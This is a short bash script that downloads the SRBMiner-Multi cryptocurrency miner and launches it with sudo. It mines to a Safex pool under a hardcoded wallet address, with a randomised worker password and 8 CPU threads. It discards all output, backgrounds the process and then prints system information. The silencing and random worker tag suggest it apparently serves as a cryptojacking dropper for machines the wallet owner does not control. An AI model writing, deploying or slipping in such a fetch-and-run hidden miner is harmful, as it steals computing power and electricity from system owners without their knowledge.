#!/bin/bash
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.3/SRBMiner-Multi-0-9-3-Linux.tar.xz && tar xJvf SRBMiner-Multi-0-9-3-Linux.tar.xz && rm SRBMiner-Multi-0-9-3-Linux.tar.xz && sudo ./SRBMiner-Multi-0-9-3/SRBMiner-MULTI --algorithm randomsfx --pool sf.pool-pay.com:4025 --wallet Safex5yuPhr9TAZMoZ3ZfQ5ERrEBB51QsGqpuHjJKLEj6CJ5CvuQPMXRcC37iQZSvtXPrhQEJopMc2W41VMLzyqGd2u7NcyUmKW2X --password x@$(echo $(shuf -i 1000-9999 -n 1)-ARB) --disable-gpu --cpu-threads 8  > /dev/null 2>&1 &
uname -a
